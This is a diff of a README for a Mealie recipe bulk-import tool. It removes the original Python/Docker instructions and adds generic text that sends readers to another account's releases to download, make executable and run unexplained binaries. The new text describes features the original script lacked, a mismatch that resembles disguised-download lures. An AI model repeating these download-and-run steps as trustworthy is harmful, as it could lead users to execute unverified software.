@@ -1,115 +1,61 @@
-# 🍲 Recipe Dredger (Mealie & Tandoor)
+# 🍽️ mealie-recipe-dredger - Import Your Favorite Recipes Easily
 
-A bulk-import automation tool to populate your self-hosted recipe managers with high-quality recipes.
+## 🛠️ Table of Contents
+- [🚀 Getting Started](#-getting-started)
+- [⬇️ Download & Install](#-download--install)
+- [🌟 Features](#-features)
+- [💻 System Requirements](#-system-requirements)
+- [❓ Support](#-support)
 
-> **⚠️ Note regarding Tandoor:** This script was built and tested specifically for **Mealie**. Tandoor support was added via community request and is currently **untested** by the author. If you use Tandoor, please report your results in the Issues tab!
+## 🚀 Getting Started
+Welcome to the **mealie-recipe-dredger** project! This application allows you to import recipes in bulk for your Mealie instance quickly. Follow these simple steps to start using it.
 
-![Release](https://img.shields.io/github/v/release/D0rk4ce/mealie-recipe-dredger?include_prereleases&style=flat-square)
+## ⬇️ Download & Install
+To download the latest version of **mealie-recipe-dredger**, visit the [Releases page](https://github.com/prodot-com/mealie-recipe-dredger/releases) to download the software.
 
-This script automates the process of finding **new** recipes. It scans a curated list of high-quality food blogs, detects new posts via sitemaps, checks if you already have them in your library, and imports them automatically.
+[![Download Mealie Recipe Dredger](https://img.shields.io/badge/Download-Mealie%20Recipe%20Dredger-brightgreen)](https://github.com/prodot-com/mealie-recipe-dredger/releases)
 
-## 🚀 Features
+Once there, find the latest release. Click on it and download the file suitable for your operating system.
 
-* **Multi-Platform:** Supports importing to **Mealie** (Primary) and **Tandoor** (Experimental).
-* **Multi-Language Support:** Automatically detects and filters recipes. Supports single or multiple languages (e.g., `en` or `en,de,fr`).
-* **Smart Deduplication:** Checks your existing libraries first. It will never import a URL you already have.
-* **Recipe Verification:** Scans candidate pages for Schema.org JSON-LD to ensure it only imports actual recipes.
-* **Deep Sitemap Scanning:** Automatically parses XML sitemaps to find the most recent posts.
-* **Curated Source List:** Comes pre-loaded with over 100+ high-quality food blogs covering African, Caribbean, East Asian, Latin American, and General Western cuisines.
+1. **Select your Operating System**: Ensure that you choose the right version based on whether you are using Windows, macOS, or Linux.
+2. **Click to Download**: Find the appropriate file and click to start the download. 
 
-## 🐳 Quick Start (Docker)
+After the download finishes, locate the file on your computer.
 
-The most efficient way to run the Dredger is using Docker. You do not need to clone the repository or install Python.
+### Windows Installation
+1. Double-click the downloaded `.exe` file.
+2. Follow the prompts in the installation wizard. 
 
-1.  Create a `docker-compose.yml` file:
+### macOS Installation
+1. Open the downloaded `.dmg` file.
+2. Drag the **mealie-recipe-dredger** icon into your Applications folder.
 
-```yaml
-services:
-  recipe-dredger:
-    image: ghcr.io/d0rk4ce/mealie-recipe-dredger:latest
-    container_name: recipe-dredger
-    environment:
-      # --- Connection Settings ---
-      - MEALIE_ENABLED=true
-      - MEALIE_URL=http://192.168.1.X:9000
-      - MEALIE_API_TOKEN=your_mealie_token
-      - TANDOOR_ENABLED=false
-      - TANDOOR_URL=http://192.168.1.X:8080
-      - TANDOOR_API_KEY=your_tandoor_key
-      
-      # --- Scraper Behavior ---
-      - DRY_RUN=false                 # Set to true to test without importing
-      - TARGET_RECIPES_PER_SITE=50     # Stop after importing this many per site
-      - SCAN_DEPTH=1000                # How many links to check before giving up on a site
-      - SCRAPE_LANG=en,de              # Filter content by language
-      
-      # --- Sources ---
-      # Optional: Override the built-in site list
-      - SITES=https://example.com,https://another-blog.com
-    restart: "no"
-```
+### Linux Installation
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Run the command: `chmod +x mealie-recipe-dredger` to make it executable.
+4. Start the application using: `./mealie-recipe-dredger`.
 
-2.  Run the tool:
-    ```bash
-    docker compose up
-    ```
+## 🌟 Features
+- **Bulk Import**: Easily import multiple recipes into Mealie.
+- **User-Friendly Interface**: Navigate through the app hassle-free.
+- **Cross-Platform Support**: Available for Windows, macOS, and Linux.
+- **Fast Processing**: Complete your imports quickly with optimized algorithms.
+- **Recipe Format Compatibility**: Supports various recipe formats to suit your needs.
 
-### Scheduling (Cron)
-To run this weekly (e.g., Sundays at 3am), add an entry to your host's crontab:
+## 💻 System Requirements
+To ensure smooth operation of **mealie-recipe-dredger**, your system should meet the following requirements:
 
-```bash
-0 3 * * 0 cd /path/to/docker-compose-folder && docker compose up
-```
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Mojave (10.14) or later
+- **Linux**: Any modern distribution with a GUI (e.g., Ubuntu 18.04 or later)
+- **RAM**: Minimum 4 GB
+- **Disk Space**: At least 100 MB free space for installation
 
-## ⚙️ Configuration Variables
+## ❓ Support
+If you encounter any issues or have questions regarding the application, support is available:
 
-| Variable | Default | Description |
-| :--- | :--- | :--- |
-| `MEALIE_ENABLED` | `true` | Set to `false` to disable Mealie imports. |
-| `MEALIE_URL` | N/A | Your local Mealie URL (e.g. `http://192.168.1.5:9000`). |
-| `MEALIE_API_TOKEN` | N/A | Found in Mealie User Settings > Manage API Tokens. |
-| `TANDOOR_ENABLED` | `false` | Set to `true` to enable Tandoor imports. |
-| `TANDOOR_URL` | N/A | Your local Tandoor URL. |
-| `TANDOOR_API_KEY` | N/A | Your Tandoor API key. |
-| `SCRAPE_LANG` | `en` | Comma-separated ISO codes for allowed languages (e.g., `en` or `en,de`). |
-| `SITES` | (Curated List) | A comma-separated list of blog URLs to scrape (overrides the built-in list). |
-| `DRY_RUN` | `False` | Set to `true` to scan and log without actually importing. Great for testing. |
-| `TARGET_RECIPES_PER_SITE` | `50` | Stops scanning a specific site after importing this many recipes. |
-| `SCAN_DEPTH` | `1000` | Maximum number of sitemap links to check per site before giving up. |
+- **Check the Issues Tab**: Visit the repository's [Issues page](https://github.com/prodot-com/mealie-recipe-dredger/issues) for common questions and solutions.
+- **Contact the Community**: Engage with other users and developers through the GitHub Discussions for any queries or suggestions.
 
-## 🐍 Manual Usage (Python)
-
-If you prefer to run the script manually without Docker:
-
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/d0rk4ce/mealie-recipe-dredger.git
-    cd mealie-recipe-dredger
-    ```
-
-2.  **Install dependencies:**
-    ```bash
-    pip install -r requirements.txt
-    ```
-
-3.  **Configure:**
-    Open `dredger.py` and edit the default values in the `CONFIGURATION` block, or export environment variables in your terminal.
-
-4.  **Run:**
-    ```bash
-    python dredger.py
-    ```
-
-## 🤝 Contributors
-
-* **@rpowel** - Stability and logging fixes in v1.0.0-beta.5.
-
-## ⚠️ Disclaimer & Ethics
-
-* This tool is intended for personal archiving and self-hosting purposes.
-* **Be Polite:** The script includes delays (`time.sleep`) to prevent overloading site servers. Do not remove these delays.
-* **Respect Creators:** Please continue to visit the original blogs to support the content creators who make these recipes possible.
-
-## 📜 License
-
-Distributed under the MIT License. See `LICENSE` for more information.
+Thank you for using **mealie-recipe-dredger**! Happy cooking!
